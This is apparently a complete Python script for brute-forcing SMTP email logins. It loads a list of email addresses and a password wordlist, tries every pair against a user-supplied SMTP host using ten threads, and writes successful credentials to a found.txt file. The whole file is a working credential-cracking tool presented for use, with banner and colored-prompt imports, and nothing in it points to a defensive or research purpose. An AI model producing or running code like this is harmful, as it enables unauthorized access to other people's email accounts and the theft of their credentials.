import smtplib
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from core.banner import banner, clear
from core.colors import r, c, g, y, ran
from core.sprint import sprint

clear()
banner()
yes = ["y", "yes"]
no = ["n", "no"]

try:
    em_choice = input(ran + "Enter path of email: " + g)
except FileNotFoundError:
    sprint(r + "File not found")
    exit(0)

try:
    pass_choice = input(y + "Do you want to use default wordlist? " + r + "(y/n) :" + g).lower()
    if pass_choice in yes:
        passlist = r"files/passwords.txt"
    else:
        passlist = input(c + "Enter path of worlist: " + g)
except FileNotFoundError:
    sprint(r + "File not found")
    exit(0)

smtp = input(f'{y}Enter Smtp Host: ')
port = input(f'{y}Enter Smtp Port: ')

o_tried = r"files/tried.txt"
o_found = r"files/found.txt"

passwords = [i.strip("\n") for i in open(passlist, "r").readlines()]
mails = [i.strip("\n") for i in open(em_choice, "r").readlines()]

def check_password(smtp, port, m, password):
    with open(o_tried, "a") as f:
        f.write(f"{m} -- {password}\n")
    try:
        smtpserver = smtplib.SMTP(smtp, port)
        smtpserver.ehlo()
        smtpserver.starttls()
        smtpserver.login(m, password)
        with open(o_found, "a") as fo:
            fo.write(f"{m} {password}\n")
        print(y + "Password Found:" + c + str(password))
        with open(o_found, "a") as fo:
            fo.write(f"{m} {password}")
        smtpserver.close()
    except smtplib.SMTPAuthenticationError:
        print(f"Password: {password} failed")

def cracker(smtp, port, max_workers=10):
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_email_password = {
            executor.submit(check_password, smtp, port, m, password): (m, password)
            for m in mails
            for password in passwords
        }
        for future in as_completed(future_to_email_password):
            m, password = future_to_email_password[future]
            try:
                future.result()
            except Exception as exc:
                print(f"{y}Mail {r}{m} {y}and Password {r}{password} {y}failed with {r}{exc}")

cracker(smtp, port)
